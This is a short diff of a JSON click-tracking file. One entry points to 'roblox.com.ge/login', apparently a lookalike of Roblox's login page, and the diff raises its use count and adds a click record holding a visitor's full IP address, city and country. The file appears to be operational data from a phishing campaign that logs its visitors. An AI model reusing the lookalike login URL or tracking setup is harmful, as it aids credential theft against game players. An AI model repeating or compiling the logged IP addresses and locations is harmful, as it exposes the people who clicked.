@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1362,
+    "useCount": 1363,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11064,6 +11064,14 @@
         "city": "Niagara Falls",
         "flag": "🇨🇦",
         "countryCode": "CA"
+      },
+      {
+        "timestamp": 1777419427759,
+        "ip": "70.125.94.158",
+        "country": "United States",
+        "city": "Birmingham",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
